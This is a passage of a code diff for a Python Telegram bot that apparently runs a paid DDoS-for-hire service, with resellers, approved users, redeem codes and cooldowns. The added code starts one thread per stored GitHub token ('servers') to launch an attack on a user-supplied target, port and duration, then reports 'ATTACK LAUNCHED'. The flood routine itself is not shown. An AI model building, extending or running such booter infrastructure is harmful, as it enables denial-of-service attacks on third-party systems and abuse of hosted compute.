-                reply_markup=get_back_keyboard()
-            )
-            user_states[user_id] = None
+        except:
+            pass
+    
+    threads = []
+    for token_data in github_tokens:
+        t = threading.Thread(target=run_attack, args=(token_data,))
+        threads.append(t)
+        t.start()
+    
+    for t in threads:
+        t.join()
+    
+    cooldown_until = time.time() + COOLDOWN_DURATION
+    save_attack_state()
+    
+    await progress.edit_text(
+        f"✅ **ATTACK LAUNCHED**\n\n🎯 {target}\n🔌 {port}\n⏱️ {duration}s\n🔑 {len(github_tokens)} servers\n\n⏳ Cooldown: {COOLDOWN_DURATION}s",
+        reply_markup=get_back_keyboard(),
+        parse_mode='Markdown'
+    )
+    
+    import asyncio
+    await asyncio.sleep(duration)
+    
+    if current_attack and current_attack.get('user_id') == user_id:
+        current_attack = None
+        save_attack_state()
 
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
@@ -2328,7 +1666,6 @@ def main():
     application.add_handler(CommandHandler("redeem", redeem_command))
     
     application.add_handler(CallbackQueryHandler(button_handler))
-    
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
@@ -2340,7 +1677,6 @@ def main():
     print(f"💰 Resellers: {len(resellers)}")
     print(f"👥 Users: {len(approved_users)}")
     print(f"🔑 Servers: {len(github_tokens)}")
-    print(f"📝 Pending: {len(load_pending_users())}")
     print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
     print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
     print(f"🎯 Max Attacks: {MAX_ATTACKS}")
@@ -2351,4 +1687,5 @@ def main():
 if __name__ == '__main__':
     main()
 
-logger.info("✅ Part 6: Message handlers and ")
+logger.info("✅ Part 6: Message handlers and main loaded")
+        
